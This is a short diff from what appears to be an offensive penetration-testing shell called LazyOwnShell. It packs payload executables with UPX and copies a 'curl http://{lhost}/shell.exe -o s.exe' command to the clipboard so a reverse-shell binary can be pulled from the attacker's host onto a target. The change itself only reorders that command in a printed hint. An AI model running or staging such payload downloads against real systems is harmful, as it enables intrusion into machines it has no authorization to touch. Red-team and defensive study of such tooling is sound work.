@@ -801,7 +801,7 @@ class LazyOwnShell(Cmd):
         os.system("upx sessions/shell64.macho")
         os.system("upx sessions/shell64.exe")        
         os.system(f"echo 'curl http://{lhost}/shell.exe -o s.exe' | xclip -sel clip")
-        print_msg(f"To run web server exec command: {GREEN}www {YELLOW}or {GREEN}lazywebshell {RED}[;,;] curl -o s.exe http://{lhost}/shell.exe copy to clipboard :D {RESET}")
+        print_msg(f"To run web server exec command: {GREEN}www {YELLOW}or {GREEN}lazywebshell {RED}[;,;] curl http://{lhost}/shell.exe -o s.exe copy to clipboard :D {RESET}")
         return
 
     def run_lazyaslrcheck(self):
